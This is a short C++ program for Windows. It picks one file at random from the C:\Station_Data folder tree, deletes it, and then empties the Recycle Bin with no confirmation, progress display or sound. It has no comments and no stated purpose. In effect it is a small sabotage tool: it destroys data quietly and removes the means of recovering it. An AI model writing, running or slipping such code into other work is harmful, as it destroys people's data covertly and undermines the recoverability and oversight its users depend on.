#include <iostream>
#include <filesystem>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <windows.h>
#include <shlobj.h>

namespace fs = std::filesystem;

void collectFiles(const fs::path& directory, std::vector<fs::path>& files) {
    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (fs::is_regular_file(entry.path())) {
            files.push_back(entry.path());
        }
    }
}

void deleteRandomFile(const std::wstring& directory) {
    std::vector<fs::path> files;
    collectFiles(directory, files);

    if (files.empty()) {
        return;
    }

    std::srand(static_cast<unsigned int>(std::time(nullptr)));
    int randomIndex = std::rand() % files.size();
    fs::path randomFile = files[randomIndex];

    try {
        DeleteFileW(randomFile.c_str());
    } catch (const fs::filesystem_error&) {
        return;
    }

    SHEmptyRecycleBinW(nullptr, nullptr, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
}

int main() {
    std::wstring directory = L"C:\\Station_Data";
    deleteRandomFile(directory);
    return 0;
}
